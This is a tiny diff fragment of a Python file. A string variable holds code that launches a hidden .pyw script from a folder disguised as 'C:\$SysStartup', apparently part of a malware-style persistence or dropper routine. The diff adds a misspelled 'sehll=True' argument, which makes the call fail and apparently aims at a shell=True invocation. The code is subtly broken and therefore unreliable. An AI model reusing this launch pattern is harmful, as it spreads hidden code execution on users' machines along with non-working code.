@@ -6,7 +6,7 @@ import threading
 
 var2 = """
 from subprocess import call
-call(['python', \"C:\$SysStartup\pslib.pyw\"]
+call(['python', \"C:\$SysStartup\pslib.pyw\"], sehll=True)
 """
 
 var = """
